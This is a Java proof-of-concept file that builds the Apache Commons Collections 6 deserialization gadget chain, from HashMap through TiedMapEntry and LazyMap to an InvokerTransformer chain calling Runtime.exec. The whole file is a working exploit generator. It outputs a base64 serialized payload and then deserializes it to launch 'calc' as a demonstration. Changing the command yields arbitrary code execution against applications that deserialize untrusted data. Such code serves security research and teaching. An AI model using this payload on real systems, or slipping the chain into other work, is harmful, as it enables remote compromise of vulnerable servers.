package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * Hashmap(hashcode)->TiedmapEntry(hashcode)->TiedMapEntry(getvalue)->Lazymap(get)->transform
 */
public class CommonsCollections6 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map=new HashMap<>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,new ConstantTransformer(1)); //随便改成什么Transformer
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap, "aaa");
        HashMap<Object, Object> hashMap=new HashMap<>();
        hashMap.put(tiedMapEntry,"bbb");
        map.remove("aaa");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazymap,chainedTransformer);
        String poc = SerializeUtils.base64serial(hashMap);
        System.out.println(poc);
        SerializeUtils.base64deserial(poc);
    }
}
